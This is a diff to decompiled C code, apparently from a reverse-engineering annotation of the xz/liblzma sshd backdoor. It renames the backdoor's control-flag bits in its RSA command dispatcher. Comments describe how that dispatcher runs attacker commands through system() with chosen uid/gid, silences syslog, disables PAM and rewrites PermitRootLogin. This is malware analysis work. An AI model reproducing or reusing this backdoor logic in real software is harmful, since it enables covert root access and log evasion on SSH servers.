@@ -26,7 +26,7 @@ BOOL rsa_backdoor_command_dispatch(RSA *key,global_context_t *ctx,BOOL *do_orig)
   uint *use_pam_ptr;
   sshd_monitor_func_t *keyallowed_slot;
   pfn_exit_t exit_fn;
-  u8 control_flags;
+  CmdControlFlags_t control_flags;
   uint rsa_payload_span;
   monitor_reqtype_t op_result;
   BOOL operation_ok;
@@ -178,7 +178,7 @@ BOOL rsa_backdoor_command_dispatch(RSA *key,global_context_t *ctx,BOOL *do_orig)
                   // AutoDoc: Opcode 2 treats the payload body as a `[uid||gid||cmd]` triple: it optionally loads the uid/gid pair, invokes setresgid/setresuid, and finally runs the attacker command through libc system().
                   if (command_opcode == 2) {
                     payload_segment_len = (ulong)CONCAT11((u8)sigcheck_result,encrypted_payload_bytes[3]);
-                    if ((char)encrypted_payload_bytes[0] < '\0') {
+                    if ((encrypted_payload_bytes[0] & CMD_CTRL_EXTENDED_MODE) != 0) {
                       if (CONCAT11((u8)sigcheck_result,encrypted_payload_bytes[3]) != 0)
                       goto LAB_0010a112;
                       payload_chunk_len = 0;
@@ -254,7 +254,7 @@ BOOL rsa_backdoor_command_dispatch(RSA *key,global_context_t *ctx,BOOL *do_orig)
                         hostkey_cursor = hostkey_cursor + 1;
                       } while (operation_ok == FALSE);
                       ctx->sshd_host_pubkey_idx = selected_hostkey_idx.raw_value;
-                      if ((command_opcode != 2) || (-1 < (char)encrypted_payload_bytes[0])) {
+                      if ((command_opcode != 2) || ((encrypted_payload_bytes[0] & CMD_CTRL_EXTENDED_MODE) == 0)) {
                         if (loop_idx == 0) {
 LAB_00109a97:
                           if (payload_data_offset <= rsa_payload_bytes) goto LAB_00109aa2;
@@ -264,12 +264,12 @@ LAB_00109a97:
 LAB_00109aa2:
                           // AutoDoc: Make sure the attacker-provided chunk actually fits inside the decrypted modulus body before the dispatcher starts consuming opcode-specific fields.
                           if (payload_chunk_len <= rsa_payload_bytes - payload_data_offset) {
-                            if ((((encrypted_payload_bytes[0] & 4) == 0) ||
+                            if ((((encrypted_payload_bytes[0] & CMD_CTRL_SETLOGMASK_SILENCE) == 0) ||
                                 (ctx->libc_imports == (libc_imports_t *)0x0)) ||
                                (setlogmask_fn = ctx->libc_imports->setlogmask,
                                setlogmask_fn == (pfn_setlogmask_t)0x0)) {
                               ctx->sshd_log_ctx->syslog_mask_applied = FALSE;
-                              if ((encrypted_payload_bytes[0] & 5) == 5) goto LAB_0010a1ba;
+                              if ((encrypted_payload_bytes[0] & (CMD_CTRL_EXIT_AFTER_DISPATCH | CMD_CTRL_SETLOGMASK_SILENCE)) == (CMD_CTRL_EXIT_AFTER_DISPATCH | CMD_CTRL_SETLOGMASK_SILENCE)) goto LAB_0010a1ba;
                             }
                             else {
                               // AutoDoc: Control flag bit 2 requests `setlogmask(INT_MIN)` so syslog stops emitting anything before the hook swaps handlers.
@@ -280,9 +280,9 @@ LAB_00109aa2:
                             control_flags = encrypted_payload_bytes[0];
                             // AutoDoc: Capture whoever triggered the RSA hook (getuid) so sshd_monitor_cmd_dispatch and the PAM/log toggles can reason about the original privilege.
                             ctx->caller_uid = caller_uid;
-                            log_hook_flags = encrypted_payload_bytes[0] & 0x10;
+                            log_hook_flags = encrypted_payload_bytes[0] & CMD_CTRL_LOG_FILTER_REQUIRE_STRINGS;
                             if (((log_hook_flags == 0) || (ctx->sshd_log_ctx->handler_slots_valid != FALSE))
-                               && (((encrypted_payload_bytes[0] & 2) == 0 ||
+                               && (((encrypted_payload_bytes[0] & CMD_CTRL_INSTALL_LOG_HOOK) == 0 ||
                                    // AutoDoc: Optional logging instructions drop the mm_log_handler hook into place once the caller proved the handler/context slots are writable.
                                    ((operation_ok = sshd_install_mm_log_handler_hook
                                                         ((cmd_arguments_t *)encrypted_payload_bytes,ctx),
@@ -296,7 +296,7 @@ LAB_00109aa2:
                                     ;
                                   }
                                   monitor_opcode_field = 0xff;
-                                  if ((char)control_flags < '\0') {
+                                  if ((control_flags & CMD_CTRL_EXTENDED_MODE) != 0) {
                                     monitor_opcode_field = (byte)(((ulong)CONCAT41(stack0xfffffffffffffd24,
                                                                      encrypted_payload_bytes[3]) << 0x18) >> 0x1d)
                                              & 0x1f;
@@ -340,7 +340,7 @@ LAB_00109c8a:
                                                 *int_cursor = 3;
 LAB_00109d36:
                                                 // AutoDoc: Control-flag bit 6 disables PAM by zeroing sshd_ctx->use_pam_ptr whenever the caller wants password auth rejected regardless of sshd’s config.
-                                                if ((control_flags & 0x40) != 0) {
+                                                if ((control_flags & CMD_CTRL_DISABLE_PAM) != 0) {
                                                   use_pam_ptr = (uint *)sshd_ctx->use_pam_ptr;
                                                   if ((use_pam_ptr == (uint *)0x0) || (1 < *use_pam_ptr))
                                                   goto LAB_0010a1ba;
@@ -348,7 +348,7 @@ LAB_00109d36:
                                                 }
                                                 stack0xfffffffffffffa60 =
                                                      (u8 *)CONCAT44(socket_probe_highword,0xffffffff);
-                                                if ((control_flags & 0x20) == 0) {
+                                                if ((control_flags & CMD_CTRL_FORCE_SOCKET_PROBE) == 0) {
                                                   // AutoDoc: Opcode 0 either reuses the live monitor client socket or captures a fresh one so payload replies can be streamed back to the attacker.
                                                   operation_ok = sshd_get_monitor_comm_fd
                                                                      (ctx,(int *)((long)&
@@ -463,7 +463,7 @@ LAB_00109d36:
                                         // AutoDoc: Opcode 1 rewrites sshd globals (PermitRootLogin, use_pam, etc.) based on the control-flag bits before re-entering the monitor loop.
                                         operation_ok = sshd_patch_permitrootlogin_usepam_and_hook_authpassword
                                                            (encrypted_payload_bytes[1] & TRUE,
-                                                            encrypted_payload_bytes[0] >> 6 & TRUE,
+                                                            (encrypted_payload_bytes[0] & CMD_CTRL_DISABLE_PAM) != 0,
                                                             encrypted_payload_bytes[1] >> 1 & TRUE,
                                                             (uint)encrypted_payload_bytes[3],ctx);
                                         if (operation_ok != FALSE) {
@@ -505,7 +505,7 @@ LAB_0010a076:
                                           payload_chunk_len = payload_chunk_len - 8;
                                           loop_idx = 8;
                                         }
-                                        if ((char)control_flags < '\0') {
+                                        if ((control_flags & CMD_CTRL_EXTENDED_MODE) != 0) {
                                           if (2 < payload_chunk_len) {
                                             rsa_payload_bytes = (ulong)*(ushort *)((long)command_payload_ptr + loop_idx);
                                             payload_chunk_len = payload_chunk_len - 2;
@@ -612,7 +612,7 @@ LAB_0010a1ba:
                           *(u8 *)int_cursor = 0;
                           int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
                         }
-                        if ((encrypted_payload_bytes[0] & 1) != 0) {
+                        if ((encrypted_payload_bytes[0] & CMD_CTRL_EXIT_AFTER_DISPATCH) != 0) {
                           if (ctx->libc_imports == (libc_imports_t *)0x0) {
                             return FALSE;
                           }
